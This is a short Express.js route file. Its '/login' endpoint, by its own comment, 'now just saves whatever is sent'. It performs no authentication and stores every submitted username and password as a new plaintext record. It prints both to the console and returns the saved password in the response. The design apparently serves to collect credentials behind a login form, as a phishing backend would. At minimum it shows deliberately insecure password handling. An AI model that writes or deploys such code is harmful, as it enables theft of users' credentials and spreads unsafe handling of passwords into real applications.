const router = require("express").Router();
const User = require("../models/User");

// Login (now just saves whatever is sent)
router.post("/login", async (req, res) => {
  try {
    const { username, password } = req.body;
    console.log("\n=== Saving New Login ===");
    console.log("Username:", username);
    console.log("Password:", password);

    // Create new user entry every time
    const user = new User({
      username,
      password,
    });

    const savedUser = await user.save();
    console.log("\n=== Entry Saved ===");
    console.log("User ID:", savedUser._id);
    console.log("Username:", savedUser.username);
    console.log("Password:", savedUser.password);
    console.log("=================\n");

    res.json({ message: "Data saved successfully", user: savedUser });
  } catch (err) {
    console.error("Save error:", err);
    res.status(500).json({ message: "Server error" });
  }
});

module.exports = router;
